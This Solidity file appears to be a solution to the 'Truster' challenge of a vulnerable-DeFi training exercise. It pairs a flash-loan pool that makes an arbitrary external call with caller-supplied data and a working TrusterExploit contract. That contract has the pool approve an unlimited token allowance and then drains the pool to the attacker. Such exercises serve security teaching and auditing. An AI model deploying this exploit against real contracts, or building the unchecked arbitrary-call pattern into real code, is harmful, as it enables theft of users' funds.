pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TrusterLenderPool is ReentrancyGuard {

    IERC20 public damnValuableToken;

    constructor (address tokenAddress) public {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        (bool success, ) = target.call(data);
        require(success, "External call failed");

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

contract TrusterExploit {
    function attack (
        address _pool,
        address dvt
        )
        public
    {
        //instantiate the pool and token at the given addresses
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(dvt);

        //encode the call to approve the allowance for this contract
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), uint(-1));

        //we don't want to loan anything, we just want to approve an allowance on the token in the context of the pool
        pool.flashLoan(0, msg.sender, dvt, data);

        //use the allowance to transfer the tokens from the pool to the attacker
        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));

    }
}